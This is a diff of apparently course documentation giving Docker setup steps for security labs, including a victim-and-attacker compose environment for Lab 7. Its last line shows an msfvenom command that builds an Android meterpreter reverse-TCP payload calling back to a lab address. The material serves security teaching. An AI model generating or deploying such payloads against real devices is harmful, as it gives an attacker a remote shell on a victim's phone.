@@ -171,10 +171,33 @@ $ docker rmi $(docker images -a -q)
 $ docker run -it yangzhou301/lab3
 ```
 
+### Lab 4
+
+- Dockerfile: {Download}`lab4/Dockerfile`
+- Remote: [yangzhou301/lab4](https://hub.docker.com/repository/docker/yangzhou301/lab4)
+- Shared Folder: `/usr/src/app`(container)
+- Command:
+
+```
+$ docker run -it --volume=<your-path>:/usr/src/app yangzhou301/lab4
+```
+
+
+
 ### Lab 7
 
-In this lab, we need to run 2 machines (victim and attack).
+In this lab, we need to run 2 machines (victim and attack), So we use `docker-compose`
 
+- Compose File: {Download}`lab7/docker-compose.yml`
+- Dockerfile(Attacker): `lab7/Dockerfile`
+- Remote(Attacker):  [yangzhou301/lab7](https://hub.docker.com/repository/docker/yangzhou301/lab7)
+- Command
+
+```sh
+# work in lab7 directory
+$ cd lab7
+$ docker-compose up -d
+```
 
 ```
 $ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.7 LPORT=4444 -f raw -o reverse_tcp.apk
